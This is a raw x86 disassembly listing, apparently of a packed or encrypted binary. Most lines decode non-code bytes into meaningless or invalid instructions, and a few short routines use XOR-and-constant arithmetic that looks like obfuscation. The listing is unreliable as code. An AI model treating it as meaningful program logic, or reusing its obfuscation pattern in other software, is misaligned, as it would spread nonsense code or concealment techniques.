  4051a3:	ficom  DWORD PTR [edx-0x3b]
  4051a6:	sbb    edx,DWORD PTR [esi+0x7a0b929d]
  4051ac:	shl    DWORD PTR ds:0xb2d9141b,cl
  4051b2:	mov    bl,0x21
  4051b4:	aam    0x50
  4051b6:	mov    fs,WORD PTR [ebx]
  4051b8:	sub    ch,dh
  4051ba:	(bad)  [edi-0x38]
  4051bd:	pop    edi
  4051be:	inc    eax
  4051bf:	inc    edx
  4051c0:	pop    esi
  4051c1:	xchg   DWORD PTR [ebx-0x5b],ebp
  4051c4:	imul   ebx,DWORD PTR [ebx],0xb96faf30
  4051ca:	pop    es
  4051cb:	mov    WORD PTR ds:0x9f3f3266,cs
  4051d1:	(bad)  
  4051d2:	cmp    DWORD PTR [eax-0x4da58dfd],esi
  4051d8:	sbb    dl,BYTE PTR [ebx-0x6e4877e7]
  4051de:	scas   eax,DWORD PTR es:[edi]
  4051df:	call   DWORD PTR [esp+edx*1+0xa]
  4051e3:	je     0x40516b
  4051e5:	iret   
  4051e6:	out    dx,al
  4051e7:	stc    
  4051e8:	mov    BYTE PTR [ecx-0x43f573f2],bh
  4051ee:	or     ebp,DWORD PTR [eax+0x6a]
  4051f1:	pop    edi
  4051f2:	mov    ds:0xbde19ca4,al
  4051f7:	sub    eax,0xb346cf99
  4051fc:	into   
  4051fd:	push   esi
  4051fe:	and    ch,cl
  405200:	hlt    
  405201:	rcl    BYTE PTR [eax+0x9],0xc5
  405205:	or     edi,DWORD PTR [edi]
  405207:	inc    edi
  405208:	jmp    0x4051d6
  40520a:	mov    ch,0x44
  40520c:	or     eax,0x15fca53c
  405211:	add    ch,dh
  405213:	mov    edi,0xba046b14
  405218:	jae    0x405277
  40521a:	add    BYTE PTR [ebx-0x17b1c39d],0xef
  405221:	mov    BYTE PTR [ebx-0x22385e63],cl
  405227:	bound  ebx,QWORD PTR [bp-0x6c]
  40522b:	add    edi,ecx
  40522d:	mov    ah,0x87
  40522f:	arpl   WORD PTR [ebp+0x29],si
  405232:	push   0xffffff8d
  405234:	addr16 loope 0x405269
  405237:	mov    cl,0x5f
  405239:	xchg   ebp,eax
  40523a:	jbe    0x405295
  40523c:	shr    cl,0x3b
  40523f:	xchg   DWORD PTR [ebx-0x4741368d],esi
  405245:	add    cl,BYTE PTR [esi]
  405247:	mov    ecx,0xbf86a441
  40524c:	jae    0x4051f7
  40524e:	test   DWORD PTR [edx-0x179e4309],eax
  405254:	jmp    0x405231
  405256:	add    DWORD PTR [edi-0x7f109e3],esp
  40525c:	mov    ecx,0x15cb3453
  405261:	sti    
  405262:	mov    WORD PTR [ebp-0x4b],ds
  405265:	add    ecx,esi
  405267:	pusha  
  405268:	ins    BYTE PTR es:[edi],dx
  405269:	shr    BYTE PTR [ebx],0x90
  40526c:	ds push 0xcaf137d7
  405272:	enter  0x892d,0x31
  405276:	stos   DWORD PTR es:[edi],eax
  405277:	sbb    eax,0x19
  40527a:	mov    WORD PTR ds:0x7bab5aab,cs
  405280:	lahf   
  405281:	retf   0x898b
  405284:	jo     0x4052e9
  405286:	out    0x7e,al
  405288:	cmc    
  405289:	aaa    
  40528a:	fld    st(5)
  40528c:	push   ss
  40528d:	icebp  
  40528e:	xor    bl,al
  405290:	jle    0x405280
  405292:	dec    edi
  405293:	pop    edi
  405294:	push   ds
  405295:	pop    es
  405296:	jae    0x405250
  405298:	pop    ecx
  405299:	xor    eax,0xb94445d8
  40529e:	shl    DWORD PTR [esi],1
  4052a0:	sti    
  4052a1:	or     ebp,0x64d36a99
  4052a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052a8:	aad    0xb
  4052aa:	out    0xd8,eax
  4052ac:	call   0x5138:0x6ef0690b
  4052b3:	inc    ecx
  4052b4:	and    edi,edi
  4052b6:	mov    eax,0xba91d45
  4052bb:	jl     0x40528d
  4052bd:	mov    ds:0x6994a339,eax
  4052c2:	sti    
  4052c3:	mov    ds:0xfa6f0daa,eax
  4052c8:	dec    esp
  4052c9:	pop    ebp
  4052ca:	fcom   DWORD PTR [ebx]
  4052cc:	int    0xaf
  4052ce:	jnp    0x40527c
  4052d0:	bound  edi,QWORD PTR [edi+0x3d]
  4052d3:	clc    
  4052d4:	jg     0x4052f8
  4052d6:	add    BYTE PTR [ecx+eiz*8],0xe0
  4052da:	jb     0x4052b7
  4052dc:	cli    
  4052dd:	hlt    
  4052de:	jge    0x405317
  4052e0:	(bad)  
  4052e1:	xchg   esp,eax
  4052e2:	jp     0x40532b
  4052e4:	push   0x7f
  4052e6:	jge    0x40532e
  4052e8:	ficomp DWORD PTR [ecx-0x3a]
  4052eb:	push   cs
  4052ec:	pop    esi
  4052ed:	mov    edi,0xdc317067
  4052f2:	mov    eax,0x2a8b3283
  4052f7:	inc    ebx
  4052f8:	dec    ebx
  4052f9:	jmp    0x694e:0x312d20e6
  405300:	ffree  st(5)
  405302:	ret    
  405303:	jg     0x4052b7
  405305:	cli    
  405306:	(bad)  
  405307:	lods   eax,DWORD PTR ds:[esi]
  405308:	sub    al,0xf2
  40530a:	jp     0x405373
  40530c:	mov    esp,0xac7460e1
  405311:	stc    
  405312:	xchg   esp,edx
  405314:	imul   ebp,eax,0xffffffb5
  405317:	mov    BYTE PTR [edx+0x2721675d],dl
  40531d:	mov    WORD PTR [eax-0x6e],?
  405320:	retf   
  405321:	sar    BYTE PTR [ecx],1
  405323:	(bad)  
  405324:	out    dx,al
  405325:	loop   0x405382
  405327:	inc    ecx
  405328:	js     0x405310
  40532a:	loop   0x405389
  40532c:	mov    ds:0xbc6852cd,al
  405331:	scas   al,BYTE PTR es:[edi]
  405332:	jmp    0xaadf:0x215fc0d4
  405339:	and    DWORD PTR [esi+0x21],ebp
  40533c:	adc    eax,0x630c90d9
  405341:	cmp    dl,BYTE PTR [ebx-0x65]
  405344:	pop    esp
  405345:	shl    BYTE PTR [edi+0x2d],1
  405348:	(bad)  
  405349:	jmp    0xdeaa7b18
  40534e:	loopne 0x405380
  405350:	icebp  
  405351:	adc    DWORD PTR [ecx],edi
  405353:	(bad)  
  405354:	jmp    0x68d3cf67
  405359:	test   eax,0x479abc9e
  40535e:	xchg   edx,eax
  40535f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405360:	lods   eax,DWORD PTR ds:[esi]
  405361:	adc    ecx,ebp
  405363:	loope  0x4053b3
  405365:	xor    esi,0xffffffb7
  405368:	test   BYTE PTR [edi],0x7c
  40536b:	mov    esi,0xc4b1c8b8
  405370:	add    DWORD PTR [ebp-0xa],ebp
  405373:	or     ah,dh
  405375:	fstp   DWORD PTR [ebx]
  405377:	push   esi
  405378:	cmp    dh,bh
  40537a:	pop    ss
  40537b:	dec    esi
  40537c:	mov    al,0xea
  40537e:	inc    edx
  40537f:	in     eax,0xda
  405381:	jp     0x405308
  405383:	cwde   
  405384:	mov    ah,0xe3
  405386:	cdq    
  405387:	imul   ecx,DWORD PTR [ebx],0xffffffb0
  40538a:	and    dh,BYTE PTR ds:0x743c0f30
  405390:	push   edx
  405391:	int3   
  405392:	dec    ebp
  405393:	enter  0xbe5,0xd7
  405397:	repz stc 
  405399:	inc    al
  40539b:	std    
  40539c:	dec    ecx
  40539d:	ret    
  40539e:	pop    ebx
  40539f:	iret   
  4053a0:	mov    ds:0xf97f893b,al
  4053a5:	dec    ecx
  4053a6:	adc    eax,DWORD PTR [eax-0xa]
  4053a9:	push   ds
  4053aa:	xlat   BYTE PTR ds:[ebx]
  4053ab:	ficom  WORD PTR [esp+ecx*4+0x436ddc77]
  4053b2:	in     al,dx
  4053b3:	cmc    
  4053b4:	xchg   BYTE PTR [edi+0x4b],ch
  4053b7:	ret    0xcd2b
  4053ba:	maskmovq mm1,(bad)
  4053bb:	test   DWORD PTR [edx+0x44],0xa7c4febd
  4053c2:	add    DWORD PTR [eax+0x60a0486b],0xffffff9e
  4053c9:	push   0xfffffffc
  4053cb:	in     eax,dx
  4053cc:	dec    ecx
  4053cd:	in     al,dx
  4053ce:	ror    ebp,1
  4053d0:	cmp    eax,0xb9beafca
  4053d5:	sbb    BYTE PTR [ecx],ah
  4053d7:	cmp    bh,al
  4053d9:	mov    al,BYTE PTR [edx]
  4053db:	add    al,BYTE PTR [ebx+0x618bcd77]
  4053e1:	lock retf 
  4053e3:	jmp    0x40545b
  4053e5:	daa    
  4053e6:	test   al,0x67
  4053e8:	xchg   esi,eax
  4053ea:	jbe    0x40541c
  4053ec:	mov    ecx,0x3b1f9aac
  4053f1:	repnz mov esp,0x3708ae6f
  4053f7:	jnp    0x40539c
  4053f9:	pop    esi
  4053fa:	test   eax,0x57e4498b
  4053ff:	daa    
  405400:	ror    BYTE PTR [ecx+0x72],cl
  405403:	je     0x405414
  405405:	rcl    BYTE PTR [ebx+0x20],cl
  405408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405409:	out    0x8d,al
  40540b:	neg    BYTE PTR [edx-0x44]
  40540e:	mov    ecx,cs
  405410:	jnp    0x405434
  405412:	sbb    dl,BYTE PTR [esp+esi*2+0x17d0c166]
  405419:	iret   
  40541a:	popa   
  40541b:	xlat   BYTE PTR ds:[ebx]
  40541c:	pop    esi
  40541d:	push   ebx
  40541e:	adc    eax,0x26435286
  405423:	fidivr DWORD PTR [ebx+ebx*4-0x426fee6c]
  40542a:	in     al,dx
  40542b:	rcl    dl,0xe1
  40542e:	hlt    
  40542f:	fwait
  405430:	aaa    
  405431:	jle    0x405480
  405433:	aaa    
  405434:	aam    0x27
  405436:	or     DWORD PTR [edx],ecx
  405438:	stos   DWORD PTR es:[edi],eax
  405439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40543a:	push   ds
  40543b:	ins    BYTE PTR es:[edi],dx
  40543c:	cdq    
  40543d:	popa   
  40543e:	addr16 dec eax
  405440:	jae    0x4053db
  405442:	pop    edi
  405443:	mov    BYTE PTR [esi],cl
  405445:	xchg   esp,eax
  405446:	push   ss
  405447:	add    DWORD PTR [esi],0x53a78c66
  40544d:	push   edx
  40544e:	addr16 inc ebp
  405450:	push   edx
  405451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405452:	das    
  405453:	sbb    ebx,DWORD PTR ds:0x624222c8
  405459:	idiv   eax
  40545b:	hlt    
  40545c:	mov    ch,0xe0
  40545e:	ss jae 0x40544c
  405461:	mov    dl,BYTE PTR [esi]
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x2543fbb8]
  405484:	xor    eax,0x7e2bd06c
  405489:	jle    0x4054e3
  40548b:	jl     0x40550b
  40548d:	jle    0x4054c9
  40548f:	jmp    0x5ab10a1b
  405494:	ds add eax,0x11ac5822
  40549a:	push   ds
  40549b:	fild   WORD PTR [esi+0x4c]
  40549e:	pop    ds
  40549f:	jns    0x40547f
  4054a1:	cmp    ecx,DWORD PTR [esi-0x11b60053]
  4054a7:	pop    esp
  4054a8:	or     BYTE PTR [edi-0x72],0x64
  4054ac:	outs   dx,BYTE PTR ds:[esi]
  4054ad:	add    ebp,DWORD PTR [edx+ecx*8-0x45bf3b7c]
  4054b4:	and    eax,0x95e34b79
  4054b9:	(bad)  
  4054ba:	repz jl 0x4054ec
  4054bd:	sub    bh,BYTE PTR [ebp+0x3d]
  4054c0:	mov    ch,0xa4
  4054c2:	sub    DWORD PTR [ecx-0x5904ec8e],edx
  4054c8:	shr    cl,0xb6
  4054cb:	pusha  
  4054cc:	mov    bh,0x7
  4054ce:	sub    esi,ecx
  4054d0:	mov    edx,0x33e5f17e
  4054d5:	stos   DWORD PTR es:[edi],eax
  4054d6:	or     eax,0xc38223ac
  4054db:	jnp    0x4054cc
  4054dd:	(bad)  
  4054de:	lahf   
  4054df:	mov    ebp,0xa319dde0
  4054e4:	mov    bl,0x6f
  4054e6:	retf   0xf0bd
  4054e9:	nop
  4054ea:	dec    ecx
  4054eb:	test   al,0x4e
  4054ed:	xor    eax,DWORD PTR [edx-0xe]
  4054f0:	fsub   DWORD PTR [ebp+0x4c4b7030]
  4054f6:	shl    BYTE PTR ds:0xaa984366,cl
  4054fc:	adc    edi,DWORD PTR [edi-0x6131a51]
  405502:	mov    esp,DWORD PTR [edi]
  405504:	xor    eax,0x4d6a013d
  405509:	repz fs dec edx
  40550c:	fnsave [eax+0x203e7897]
  405512:	inc    eax
  405513:	aas    
  405514:	(bad)  
  405515:	push   ecx
  405516:	cdq    
  405517:	rcl    BYTE PTR [edx],1
  405519:	cdq    
  40551a:	mov    edx,0x2dc928fe
  40551f:	int    0x2d
  405521:	scas   eax,DWORD PTR es:[edi]
  405522:	pop    edx
  405523:	cli    
  405524:	and    ah,al
  405526:	inc    edx
  405527:	inc    esi
  405528:	and    BYTE PTR [ecx],0xba
  40552b:	inc    BYTE PTR [esi-0x69]
  40552e:	daa    
  40552f:	dec    ebx
  405530:	fwait
  405531:	mov    al,ds:0x528a8042
  405536:	(bad)  
  405537:	adc    esp,eax
  405539:	mov    ch,0x91
  40553b:	loope  0x405584
  40553d:	xchg   ebp,eax
  40553e:	(bad)  
  40553f:	mov    ebx,0x7918b1e2
  405544:	cli    
  405545:	out    dx,eax
  405546:	cld    
  405547:	push   0xaaea77ef
  40554c:	push   ebx
  40554d:	test   eax,0x8b48a1e7
  405552:	test   BYTE PTR [ecx],al
  405554:	mov    eax,0x974e7cdc
  405559:	mov    ebp,0x65811aae
  40555e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555f:	mov    bl,ch
  405561:	fstp   DWORD PTR [ebx]
  405563:	retf   
  405564:	mov    esp,0x9a9eedae
  405569:	(bad)  
  40556a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556b:	mov    ah,0x85
  40556d:	lea    esp,[esi-0x10921c73]
  405573:	mov    ebp,ss
  405575:	sbb    DWORD PTR [ebx],ebp
  405577:	cmp    edi,DWORD PTR [esi]
  405579:	mov    edx,0x21824470
  40557e:	mov    dh,0x7c
  405580:	idiv   BYTE PTR [esp+ecx*8]
  405583:	je     0x4055d9
  405585:	ss ss and ecx,edi
  405589:	push   ecx
  40558a:	rol    BYTE PTR [edx+0xa7b3fa2],0xe7
  405591:	sub    BYTE PTR [ecx+0xbc29b3b],cl
  405597:	out    dx,eax
  405598:	push   edx
  405599:	pop    esp
  40559a:	hlt    
  40559b:	dec    esi
  40559c:	sub    al,0x99
  40559e:	pushf  
  40559f:	imul   ebx,DWORD PTR [ebp+0x63],0x2d
  4055a3:	dec    ecx
  4055a4:	lahf   
  4055a5:	inc    edx
  4055a6:	das    
  4055a7:	xchg   ebp,eax
  4055a8:	ins    DWORD PTR es:[edi],dx
  4055a9:	lds    ebp,FWORD PTR [edi]
  4055ab:	ret    0x696a
  4055ae:	and    dh,al
  4055b0:	mov    WORD PTR [edi-0x134b01fe],ss
  4055b6:	dec    DWORD PTR [ebp+ecx*8+0x3218e447]
  4055bd:	mov    gs,WORD PTR [edx-0x58d0e38b]
  4055c3:	pop    esi
  4055c4:	add    eax,0xde5e2cdc
  4055c9:	and    eax,0xc926db90
  4055ce:	add    DWORD PTR [eax+0x6e],ebx
  4055d1:	mov    ds,WORD PTR [ebp+eax*1+0x2]
  4055d5:	lahf   
  4055d6:	jle    0x4055b1
  4055d8:	(bad)  [edx]
  4055da:	mov    dh,0x58
  4055dd:	inc    ebx
  4055de:	rcr    DWORD PTR [esi-0x42],cl
  4055e1:	fsub   DWORD PTR [edi-0x33d4aa85]
  4055e7:	call   0x15d7:0x1728b55a
  4055ee:	mov    ebx,0x91dcf2d9
  4055f3:	sub    edi,DWORD PTR [esi-0x3da48144]
  4055f9:	pop    ebx
  4055fa:	mov    ebp,0x39e1145b
  4055ff:	retf   
  405600:	ins    BYTE PTR es:[edi],dx
  405601:	sti    
  405602:	in     eax,dx
  405603:	sub    DWORD PTR [edx+eiz*8-0x27],0xe18bb27
  40560b:	sbb    ah,0x8f
  40560e:	mov    WORD PTR [eax],fs
  405610:	cwde   
  405611:	sub    BYTE PTR [esi],ch
  405613:	mov    ?,edx
  405615:	push   0x7a
  405617:	inc    ebp
  405618:	jno    0x4055b6
  40561a:	mov    eax,ds:0xe342608d
  40561f:	sub    BYTE PTR [ebp-0x5f0c90c0],cl
  405625:	and    eax,0x6074808c
  40562a:	push   ss
  40562b:	std    
  40562c:	and    cl,BYTE PTR [edx]
  40562e:	(bad)  
  40562f:	imul   esp
  405631:	or     eax,0xd89f84ca
  405636:	stos   DWORD PTR es:[edi],eax
  405637:	loopne 0x4055fd
  405639:	add    al,0x66
  40563b:	sbb    al,0x1e
  40563d:	inc    ebp
  40563e:	cmc    
  40563f:	shl    DWORD PTR [esi],1
  405641:	sbb    DWORD PTR [edx],edx
  405643:	pop    ds
  405644:	xchg   bl,ah
  405646:	xor    BYTE PTR [edx],cl
  405648:	pop    ebx
  405649:	mov    bl,0xda
  40564b:	sbb    al,0xc8
  40564d:	loop   0x4056cb
  40564f:	cmp    DWORD PTR [eax-0x2cdcc99f],edi
  405655:	into   
  405656:	mov    al,ds:0xb1711945
  40565b:	xchg   esi,eax
  40565c:	xor    ecx,edi
  40565e:	lds    ebx,FWORD PTR [ecx-0x16fc996d]
  405664:	pop    edx
  405665:	mov    ch,0xea
  405667:	push   ds
  405668:	add    BYTE PTR [edi+0x6f],dl
  40566b:	mov    bh,0x5b
  40566d:	fstp   st(1)
  40566f:	mov    edi,0xe04296b1
  405674:	adc    eax,0x63b80a63
  405679:	das    
  40567a:	adc    al,al
  40567c:	mov    dl,al
  40567e:	out    dx,al
  40567f:	retf   
  405680:	push   ecx
  405681:	test   DWORD PTR ds:0xd1862a10,0xa9bff623
  40568b:	add    DWORD PTR [eax-0x6b11aebb],eax
  405691:	push   ebp
  405692:	jp     0x4056e7
  405694:	dec    esi
  405695:	outs   dx,DWORD PTR ds:[esi]
  405696:	shl    DWORD PTR [ecx+0x23],1
  405699:	iret   
  40569a:	inc    eax
  40569b:	retf   0x9ab4
  40569e:	and    al,0x4f
  4056a0:	(bad)  [ebx+0x33]
  4056a3:	adc    dh,BYTE PTR [ecx+ebp*1+0x64f06208]
  4056aa:	arpl   ax,sp
  4056ac:	out    0x71,eax
  4056ae:	sub    DWORD PTR [esi+eiz*2-0x2e89ac01],ebp
  4056b5:	mov    eax,0xa4f2904e
  4056ba:	xchg   edx,eax
  4056bb:	scas   al,BYTE PTR es:[edi]
  4056bc:	hlt    
  4056bd:	lock outs dx,DWORD PTR ds:[esi]
  4056bf:	stos   BYTE PTR es:[edi],al
  4056c0:	cli    
  4056c1:	mov    esp,0xd9369c0d
  4056c6:	xor    eax,0x6934ed1c
  4056cb:	jmp    0x40566b
  4056cd:	in     al,dx
  4056ce:	xor    edx,DWORD PTR [edx]
  4056d0:	pop    esp
  4056d1:	push   ebp
  4056d2:	js     0x4056ca
  4056d4:	repz (bad) 
  4056d6:	out    dx,al
  4056d7:	lock inc ecx
  4056d9:	es jb  0x40565f
  4056dc:	sbb    BYTE PTR [ecx],al
  4056de:	jae    0x4056ad
  4056e0:	pop    ebx
  4056e1:	dec    esp
  4056e2:	pop    eax
  4056e3:	outs   dx,DWORD PTR ds:[esi]
  4056e4:	js     0x4056d4
  4056e6:	in     eax,dx
  4056e7:	add    BYTE PTR [ebx-0x5246515],bl
  4056ed:	pop    es
  4056ee:	in     al,dx
  4056ef:	adc    DWORD PTR [ebx-0x4870d213],edx
  4056f5:	pop    es
  4056f6:	jmp    0x4056b3
  4056f8:	mov    edx,0xe231eef9
  4056fd:	pop    ebx
  4056fe:	adc    BYTE PTR [edi+0x4d],ah
  405701:	dec    esp
  405702:	and    esi,DWORD PTR [ecx]
  405704:	fsubr  QWORD PTR [edx-0x61b948d2]
  40570a:	sti    
  40570b:	adc    eax,DWORD PTR [ebx-0x5b]
  40570e:	outs   dx,BYTE PTR ds:[esi]
  40570f:	inc    eax
  405710:	mov    esi,0x60953cde
  405715:	pop    edx
  405716:	arpl   WORD PTR [ebp-0x2e],si
  405719:	ja     0x4056ad
  40571b:	or     bl,dl
  40571d:	xchg   ebx,eax
  40571e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40571f:	stos   BYTE PTR es:[edi],al
  405720:	cmp    al,0x6e
  405722:	sbb    edi,DWORD PTR [ecx+ebx*1-0x1f73271c]
  405729:	pop    edi
  40572a:	xor    edi,DWORD PTR [edi-0x5b]
  40572d:	(bad)  
  40572e:	pop    esi
  40572f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405730:	repnz and DWORD PTR [ebp-0x1d904f80],ebx
  405737:	imul   esp,ebp,0xffffffbc
  40573a:	mov    ds:0x4b21a448,al
  40573f:	test   DWORD PTR [edi],0x60a5d9e9
  405745:	or     eax,DWORD PTR [eax+0x14]
  405748:	push   ss
  405749:	mov    DWORD PTR [edi+0x78],esi
  40574c:	je     0x405752
  40574e:	pop    eax
  40574f:	jbe    0x4056f4
  405751:	cli    
  405752:	xchg   esp,eax
  405753:	or     DWORD PTR [esi+0xe],0xa934dcfe
  40575a:	(bad)  
  40575b:	lods   al,BYTE PTR ds:[esi]
  40575c:	jle    0x40573e
  40575e:	xchg   edi,eax
  40575f:	mov    al,ds:0x7370fc92
  405764:	jnp    0x405788
  405766:	(bad)  
  405767:	push   ss
  405768:	retf   
  405769:	retf   0xe6d6
  40576c:	mov    dh,0x1c
  40576e:	mov    ebp,0x56801ff9
  405773:	div    DWORD PTR [ebx]
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x4f
  4057f5:	enter  0x7968,0x3a
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	dec    edx
  405801:	sbb    eax,0x31110c5d
  405806:	xchg   bh,bl
  405808:	fidivr WORD PTR [edi+0x33]
  40580b:	add    al,0x1b
  40580d:	mov    edi,0xdda9fe5a
  405812:	xchg   ebx,eax
  405813:	pop    esp
  405814:	push   cs
  405815:	fnstcw WORD PTR [esi]
  405817:	pushf  
  405818:	mov    bl,0x83
  40581a:	(bad)  
  40581c:	pop    ss
  40581d:	std    
  40581e:	inc    esp
  40581f:	push   edx
  405820:	fisttp WORD PTR [edi-0x62b3fcfb]
  405826:	add    al,0x45
  405828:	shld   DWORD PTR [eax-0x13],ecx,0x6
  40582d:	mov    ah,0x3d
  405830:	pop    es
  405831:	test   eax,0x4ec5acb1
  405836:	jbe    0x4057e6
  405838:	pop    es
  405839:	popf   
  40583a:	xor    bh,al
  40583c:	inc    ebx
  40583d:	inc    ebp
  40583e:	push   edx
  40583f:	inc    ebx
  405840:	cmp    BYTE PTR [esi+0x1e],bh
  405843:	add    DWORD PTR [ebp-0x3730dc21],ebx
  405849:	(bad)
  40584d:	sbb    DWORD PTR [esi+0x3f],edi
  405850:	scas   al,BYTE PTR es:[edi]
  405851:	fwait
  405852:	dec    esi
  405853:	(bad)  
  405854:	jle    0x405858
  405856:	and    cl,BYTE PTR [ebx-0x8]
  405859:	ins    BYTE PTR es:[di],dx
  40585b:	add    ebx,esp
  40585d:	sahf   
  40585e:	mov    ecx,0xe4cfb991
  405863:	daa    
  405864:	cli    
  405865:	ret    0x1e3a
  405868:	push   esi
  405869:	mov    DWORD PTR [ebx],0xc4329f24
  40586f:	sub    eax,0xc701c6db
  405874:	adc    dl,dh
  405876:	sbb    eax,0xddba1a2c
  40587b:	scas   al,BYTE PTR es:[edi]
  40587c:	mov    bh,0x16
  40587e:	jno    0x40580d
  405880:	xchg   esp,eax
  405881:	cmp    al,0x32
  405883:	xchg   esp,eax
  405884:	or     bl,BYTE PTR [ecx+0x3a276d4e]
  40588a:	sbb    DWORD PTR [edi],esp
  40588c:	das    
  40588d:	clc    
  40588e:	call   0x91b4:0x51d90f22
  405895:	mov    esi,0x8bbe1817
  40589a:	les    esi,FWORD PTR [ebp-0x46]
  40589d:	mov    ?,ebp
  40589f:	push   ebx
  4058a0:	push   0xeb4c4767
  4058a5:	out    dx,al
  4058a6:	sub    eax,DWORD PTR [eax]
  4058a8:	out    0x94,al
  4058aa:	jmp    0xf8884c3f
  4058af:	stos   DWORD PTR es:[edi],eax
  4058b0:	cli    
  4058b1:	add    dh,BYTE PTR [ebx-0x44]
  4058b4:	mov    ds:0x8ed4ad59,eax
  4058b9:	jbe    0x4058a5
  4058bb:	(bad)  
  4058bd:	adc    al,0x6e
  4058bf:	push   ds
  4058c0:	adc    ah,BYTE PTR [edx+0x4a]
  4058c3:	int    0x43
  4058c5:	mov    bl,0x88
  4058c7:	dec    edi
  4058c8:	cmp    eax,0x2256831d
  4058cd:	mov    ch,0x85
  4058cf:	sbb    bh,BYTE PTR [ebx+0x68]
  4058d2:	inc    edi
  4058d3:	imul   edx,DWORD PTR [edx+0x1],0x51cd1579
  4058da:	gs shl esi,0x89
  4058de:	or     eax,0xf279e523
  4058e3:	mov    bh,0x45
  4058e5:	jge    0x4058af
  4058e7:	and    eax,0xaf8ebe7a
  4058ec:	dec    eax
  4058ed:	and    BYTE PTR [ecx-0x714b0fbc],bh
  4058f3:	(bad)  
  4058f4:	aaa    
  4058f5:	icebp  
  4058f6:	jne    0x40593a
  4058f8:	ret    0xf72c
  4058fb:	loope  0x4058b9
  4058fd:	mov    BYTE PTR [ecx+0x1],cl
  405900:	in     eax,0xcf
  405902:	ds repnz loop 0x40596c
  405906:	popa   
  405907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405908:	dec    edi
  405909:	xchg   edi,eax
  40590a:	arpl   WORD PTR [ecx],ax
  40590c:	rcr    BYTE PTR [esi+0x47],cl
  40590f:	jbe    0x405979
  405911:	and    BYTE PTR ds:0x606860ea,0x22
  405918:	xor    bl,dh
  40591a:	fs in  eax,0x2d
  40591d:	dec    eax
  40591e:	mov    al,ds:0x6d911b3b
  405923:	test   BYTE PTR [ebx-0x1e044ece],bh
  405929:	sbb    BYTE PTR ds:0x5028cf5f,ah
  40592f:	out    dx,al
  405930:	js     0x40595f
  405932:	mov    BYTE PTR [eax],0xfd
  405935:	xchg   ecx,eax
  405936:	jg     0x4058ff
  405938:	pop    ebx
  405939:	pop    es
  40593a:	popf   
  40593b:	in     eax,0xe
  40593d:	add    dh,BYTE PTR [ebp+0x4530322c]
  405943:	call   0xa5be830
  405948:	mov    eax,0x297c5015
  40594d:	ds fwait
  40594f:	dec    esp
  405950:	les    ecx,FWORD PTR [edi+0x65]
  405953:	adc    BYTE PTR [ebx],cl
  405955:	xchg   ebp,eax
  405956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405957:	pop    esi
  405958:	je     0x40595b
  40595a:	ds std 
  40595c:	xlat   BYTE PTR ds:[ebx]
  40595d:	arpl   WORD PTR [ebp+edx*4+0x1b],bp
  405961:	fimul  DWORD PTR [esi+0x6dddb260]
  405967:	sti    
  405968:	shr    DWORD PTR [ebx+0x323785dd],0x5c
  40596f:	pop    ebp
  405970:	out    0x5c,eax
  405972:	fimul  DWORD PTR [edi+ebx*1]
  405975:	add    eax,0xf214fd39
  40597a:	or     al,0x59
  40597c:	sbb    ah,cl
  40597e:	in     eax,dx
  40597f:	inc    ebp
  405980:	jb     0x405924
  405982:	repnz rcl DWORD PTR [edx+0x21ba8141],0x97
  40598a:	idiv   DWORD PTR gs:[ebp-0x28]
  40598e:	inc    edx
  40598f:	clc    
  405990:	xchg   DWORD PTR [edx+0x7f0a29e8],edx
  405996:	aaa    
  405997:	and    edi,esp
  405999:	or     esi,DWORD PTR [ebp+ebp*4+0x77c054d4]
  4059a0:	adc    ebx,DWORD PTR [esi]
  4059a2:	add    edx,DWORD PTR [esi+eax*4]
  4059a5:	or     ebx,DWORD PTR [ebp+0x519b569c]
  4059ab:	(bad)  
